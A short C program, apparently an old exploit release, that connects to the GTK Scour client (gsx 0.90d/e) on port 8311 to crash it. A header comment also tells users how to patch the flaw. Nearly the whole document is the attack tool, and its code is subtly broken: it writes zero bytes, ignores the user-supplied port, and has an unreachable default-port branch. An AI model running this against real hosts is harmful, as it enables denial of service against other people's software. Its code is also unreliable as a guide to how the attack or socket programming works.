/* tested on gsx-0.90d and gsx-0.90e
/* the GTK scour client for linux crashes after recieving multiple
/* connections in a row, to fix, edit tcpip.h and change
/* #define MAXCONNECTIONS 200 to a smaller number than 200, I've only
/* tested with MAXCONNECTIONS 100, and that seems to work fine.
/* -kilrid@berZerker.net
/* www.Hack-X.org */

#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>

char buf[1024];
char exgsx[] = "0x1d";
int c;
int port;
int sock;
struct hostent *hp;
struct sockaddr_in s;

int main( int argc, char *argv[] ) {

if(argc < 2) { printf("exgsx - kilrid@berZerker.net\nUsage: %s <host> <port> - default 8311\n", argv[0]
);
	exit( -1 );
 }

if (argc == 1) { 
	port = 8311; 
}
if (argc == 3) { 
	port = (atoi(argv[2])); 
}

hp=gethostbyname(argv[1]);
   if (!hp) {  
     perror("Failed to resolve host");   
	exit( -1 );
    }
else {
	    bcopy(hp->h_addr,(void*)&s.sin_addr,hp->h_length);
    			s.sin_family=hp->h_addrtype;
    	 		s.sin_port=htons(8311);
 if ((sock=socket(AF_INET,SOCK_STREAM,0))<0) perror("can't startup socket");
    	if (connect(sock,(struct sockaddr *)&s,sizeof(s))) perror("problem:");
    		write(sock, exgsx,0);
    			recv(sock, buf, sizeof(buf),0); 
   }
}
